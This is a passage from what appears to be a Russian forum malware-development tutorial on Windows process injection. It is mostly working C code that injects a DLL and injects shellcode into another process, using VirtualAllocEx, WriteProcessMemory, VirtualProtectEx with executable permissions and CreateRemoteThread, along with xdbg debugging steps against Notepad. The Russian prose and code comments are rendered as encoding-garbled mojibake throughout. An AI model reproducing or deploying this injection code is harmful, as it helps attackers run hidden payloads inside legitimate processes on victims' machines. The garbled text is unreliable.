		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

    BOOL        bSTATE                    = TRUE;

    LPVOID        pLoadLibraryW             = NULL;
    LPVOID        pAddress                  = NULL;

    // –ø–æ–ª—É—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ DllName *–≤ –±–∞–π—Ç–∞—Ö* (–¥–ª—è –∑–∞–ø–∏—Å–∏ –≤ –ø–∞–º—è—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–∞)
    DWORD        dwSizeToWrite             = (wcslen(DllName) + 1) * sizeof(WCHAR);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ LoadLibraryW
    pLoadLibraryW = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);
    if (pLoadLibraryW == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ó–∞–ø–∏—Å—å DllName –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π —Ä–µ–≥–∏–æ–Ω –ø–∞–º—è—Ç–∏
    SIZE_T lpNumberOfBytesWritten = NULL;
    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten)) {
        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ Dll
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);

    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>–û—Ç–ª–∞–¥–∫–∞ (–í –∫–∞—á–µ—Å—Ç–≤–µ –¥–æ–º–∞—à–Ω–µ–≥–æ –∑–∞–¥–∞–Ω–∏—è –Ω–∞–ø–∏—à–∏—Ç–µ –ø—Ä–æ–µ–∫—Ç —Å–∞–º–∏ –∏ –ø—Ä–æ–¥–µ–ª–∞–π—Ç–µ —Å–∞–º–∏ –æ–ø–∏—Å–∞–Ω–Ω–æ–µ –Ω–∏–∂–µ)</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ—Ç–ª–∞–¥—á–∏–∫–∞ xdbg, —á—Ç–æ–±—ã –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç &quot;–ø–æ–¥ –∫–∞–ø–æ—Ç–æ–º&quot;.<br />
<br />
–°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–µ RemoteDllInjection.exe –∏ –ø–µ—Ä–µ–¥–∞–π—Ç–µ –¥–≤–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞: —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å –∏ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ DLL, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –≤–Ω–µ–¥—Ä–∏—Ç—å –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
–í —ç—Ç–æ–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –≤–Ω–µ–¥—Ä—è–µ—Ç—Å—è notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779423138.png"
		data-src="https://osint42.org/attachments/1746779423138-png.94/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779423138-png.94/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779423138.png"
			title="1746779423138.png"
			width="1378" height="272" loading="lazy" />
	</div><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ PID Notepad –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ä–∞–≤–µ–Ω 20932, –∏—Å–ø–æ–ª—å–∑—É—è Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779430972.png"
		data-src="https://osint42.org/attachments/1746779430972-png.95/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779430972-png.95/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779430972.png"
			title="1746779430972.png"
			width="1183" height="175" loading="lazy" />
	</div><br />
<br />
–î–∞–ª–µ–µ, –∫ —Ü–µ–ª–µ–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É, –ë–ª–æ–∫–Ω–æ—Ç—É, –ø—Ä–∏—Å–æ–µ–¥–∏–Ω—è–µ—Ç—Å—è xdbg, –∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –∞–¥—Ä–µ—Å. –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –±—É—Ñ–µ—Ä –±—ã–ª —É—Å–ø–µ—à–Ω–æ –≤—ã–¥–µ–ª–µ–Ω.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779439202.png"
		data-src="https://osint42.org/attachments/1746779439202-png.96/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779439202-png.96/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779439202.png"
			title="1746779439202.png"
			width="1558" height="663" loading="lazy" />
	</div><br />
<br />
–ü–æ—Å–ª–µ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –∏–º—è DLL –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –≤ –±—É—Ñ–µ—Ä.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779449639.png"
		data-src="https://osint42.org/attachments/1746779449639-png.97/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779449639-png.97/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779449639.png"
			title="1746779449639.png"
			width="1724" height="530" loading="lazy" />
	</div><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç DLL.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779457528.png"
		data-src="https://osint42.org/attachments/1746779457528-png.98/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779457528-png.98/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779457528.png"
			title="1746779457528.png"
			width="1648" height="578" loading="lazy" />
	</div><br />
<br />
–ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ DLL –±—ã–ª —É—Å–ø–µ—à–Ω–æ –≤–Ω–µ–¥—Ä–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É—è –≤–∫–ª–∞–¥–∫—É &quot;–º–æ–¥—É–ª–∏&quot; –≤ Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779465694.png"
		data-src="https://osint42.org/attachments/1746779465694-png.99/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779465694-png.99/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779465694.png"
			title="1746779465694.png"
			width="695" height="593" loading="lazy" />
	</div><br />
<br />
–ü–µ—Ä–µ–π–¥–∏—Ç–µ –Ω–∞ –≤–∫–ª–∞–¥–∫—É &quot;–ø–æ—Ç–æ–∫–∏&quot; –≤ Process Hacker –∏ –æ–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ –ø–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç LoadLibraryW –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Å–≤–æ–µ–π –Ω–∞—á–∞–ª—å–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779472031.png"
		data-src="https://osint42.org/attachments/1746779472031-png.100/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779472031-png.100/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779472031.png"
			title="1746779472031.png"
			width="712" height="315" loading="lazy" />
	</div></div>
						

							<h2>–ò–Ω—ä–µ–∫—Ü–∏—è —à–µ–ª–ª-–∫–æ–¥–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746779866144.png"
		data-src="https://osint42.org/attachments/1746779866144-png.101/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779866144-png.101/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779866144.png"
			title="1746779866144.png"
			width="1185" height="679" loading="lazy" />
	</div><br />
<br />
–≠—Ç–∞ —Å—Ç–∞—Ç—å—è –ø–æ—Ö–æ–∂–∞ –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â—É—é DLL Injection —Å –Ω–µ–±–æ–ª—å—à–∏–º–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è–º–∏.<br />
<br />
–ò–Ω—ä–µ–∫—Ü–∏—è shellcode –≤ –ø—Ä–æ—Ü–µ—Å—Å –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ —Ç–µ –∂–µ —Å–∞–º—ã–µ API Windows.<br />
<br />
VirtualAllocEx - –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏.<br />
<br />
WriteProcessMemory - –∑–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
VirtualProtectEx - –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏.<br />
<br />
CreateRemoteThread - –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫.<br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</b><br />
<br />
–ö–∞–∫ –∏ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Å—Ç–∞—Ç—å–µ, –∏–Ω—ä–µ–∫—Ü–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
<br />
–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –¥–ª—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–π –Ω–∏–∂–µ, —É–∂–µ –±—ã–ª –æ–±—ä—è—Å–Ω–µ–Ω –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Å—Ç–∞—Ç—å–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
// –°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:
// –ü–µ—Ä–µ–¥ –≤—ã–∑–æ–≤–æ–º —Ñ—É–Ω–∫—Ü–∏–∏ Process32First —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —á–ª–µ–Ω dwSize –≤ sizeof(PROCESSENTRY32).
// –ï—Å–ª–∏ dwSize –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω, Process32First –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —Å –æ—à–∏–±–∫–æ–π.
PROCESSENTRY32 Proc = {
    .dwSize = sizeof(PROCESSENTRY32)
};

HANDLE hSnapShot = NULL;

// –°–æ–∑–¥–∞–µ—Ç —Å–Ω–∏–º–æ–∫ —Ç–µ–∫—É—â–∏—Ö –≤—ã–ø–æ–ª–Ω—è—é—â–∏—Ö—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
if (hSnapShot == INVALID_HANDLE_VALUE){
    printf(&quot;[!] CreateToolhelp32Snapshot –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    goto _EndOfFunction;
}

// –ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–≤–æ–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
if (!Process32First(hSnapShot, &amp;Proc)) {
    printf(&quot;[!] Process32First –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    goto _EndOfFunction;
}

do {

    WCHAR LowerName[MAX_PATH * 2];

    if (Proc.szExeFile) {
        DWORD dwSize = lstrlenW(Proc.szExeFile);
        DWORD i = 0;

        RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

        // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∫–∞–∂–¥–æ–≥–æ —Å–∏–º–≤–æ–ª–∞ –≤ Proc.szExeFile –≤ —Å–∏–º–≤–æ–ª –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ
        // –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –µ–≥–æ –≤ LowerName
        if (dwSize &lt; MAX_PATH * 2) {

            for (; i &lt; dwSize; i++)
                LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

            LowerName[i++] = &#039;\0&#039;;
        }
    }

    // –ï—Å–ª–∏ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –∏—Å–∫–æ–º—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º
    if (wcscmp(LowerName, szProcessName) == 0) {
        // –°–æ—Ö—Ä–∞–Ω–∏—Ç—å PID
        *dwProcessId = Proc.th32ProcessID;
        // –û—Ç–∫—Ä—ã—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
        *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
        if (*hProcess == NULL)
            printf(&quot;[!] OpenProcess –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());

        break;
    }

// –ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–ª–µ–¥—É—é—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –≤ —Å–Ω–∏–º–∫–µ.
// –ü–æ–∫–∞ –≤ —Å–Ω–∏–º–∫–µ –æ—Å—Ç–∞–µ—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å, –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º —Ü–∏–∫–ª
} while (Process32Next(hSnapShot, &amp;Proc));

// –û—á–∏—Å—Ç–∫–∞
_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ò–Ω—ä–µ–∫—Ü–∏—è Shellcode</b><br />
<br />
–î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∏–Ω—ä–µ–∫—Ü–∏–∏ shellcode –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è InjectShellcodeToRemoteProcess.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 3 –ø–∞—Ä–∞–º–µ—Ç—Ä–∞:<br />
<br />
hProcess - –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
pShellcode - –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∏ —Ä–∞–∑–º–µ—Ä —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ shellcode. Shellcode –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ –≤–∏–¥–µ —Ç–µ–∫—Å—Ç–∞ –ø–µ—Ä–µ–¥ –∏–Ω—ä–µ–∫—Ü–∏–µ–π, –ø–æ—Ç–æ–º—É —á—Ç–æ –µ–≥–æ –Ω–µ–ª—å–∑—è —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å, –∫–æ–≥–¥–∞ –æ–Ω —É–∂–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
sSizeOfShellcode - –†–∞–∑–º–µ—Ä shellcode.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è InjectShellcodeToRemoteProcess - –§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

PVOID pShellcodeAddress = NULL;

SIZE_T sNumberOfBytesWritten = NULL;
DWORD dwOldProtection = NULL;

// –í—ã–¥–µ–ª—è–µ–º –ø–∞–º—è—Ç—å –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ —Ä–∞–∑–º–µ—Ä–æ–º sSizeOfShellcode
pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (pShellcodeAddress == NULL) {
    printf(&quot;[!] VirtualAllocEx –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return FALSE;
}
printf(&quot;[i] –í—ã–¥–µ–ª–µ–Ω–∞ –ø–∞–º—è—Ç—å –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p \n&quot;, pShellcodeAddress);


printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; –¥–ª—è –∑–∞–ø–∏—Å–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏... &quot;);
getchar();
// –ó–∞–ø–∏—Å—ã–≤–∞–µ–º shellcode –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—É—é –ø–∞–º—è—Ç—å
if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &amp;sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
    printf(&quot;[!] WriteProcessMemory –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return FALSE;
}
printf(&quot;[i] –£—Å–ø–µ—à–Ω–æ –∑–∞–ø–∏—Å–∞–Ω–æ %d –±–∞–π—Ç\n&quot;, sNumberOfBytesWritten);

memset(pShellcode, &#039;\0&#039;, sSizeOfShellcode);

// –î–µ–ª–∞–µ–º –ø–∞–º—è—Ç—å –≤—ã–ø–æ–ª–Ω–∏–º–æ–π
if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
    printf(&quot;[!] VirtualProtectEx –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return FALSE;
}


printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è... &quot;);
getchar();
printf(&quot;[i] –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏... &quot;);

// –ó–∞–ø—É—Å–∫–∞–µ–º shell
if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
}

    printf(&quot;[+] DONE !\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ</b><br />
<br />
VirtualFreeEx - —ç—Ç–æ WinAPI, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è —Ä–∞–Ω–µ–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. –≠—Ç—É —Ñ—É–Ω–∫—Ü–∏—é —Å–ª–µ–¥—É–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, –∏–Ω–∞—á–µ —ç—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—é —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ —Å–±–æ—é –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL VirtualFreeEx(
[in] HANDLE hProcess,
[in] LPVOID lpAddress,
[in] SIZE_T dwSize,
[in] DWORD dwFreeType
);</code></pre>
	</div>
</div><br />
VirtualFreeEx –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ç–∞–∫–∏–µ –∂–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –∫–∞–∫ –∏ API VirtualFree, –Ω–æ —Å –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–º –æ—Ç–ª–∏—á–∏–µ–º: VirtualFreeEx –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä (hProcess), –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å, –≥–¥–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏.<br />
<br />
<b>–û—Ç–ª–∞–¥–∫–∞</b><br />
<br />
–í–æ–æ–±—â–µ –æ—Ç–ª–∞–¥–∫–∞ –ø–æ—Ö–æ–∂–∞ –∫–∞–∫ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ:<a href="https://ru-sfera.pw/threads/razrabotka-malvari-12-inekcija-v-process.4436/" target="_blank" class="link link--external" rel="noopener">–£—Ä–æ–∫–∏ - –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –º–∞–ª–≤–∞—Ä–∏-12. –ò–Ω—å–µ–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å</a><br />
<br />
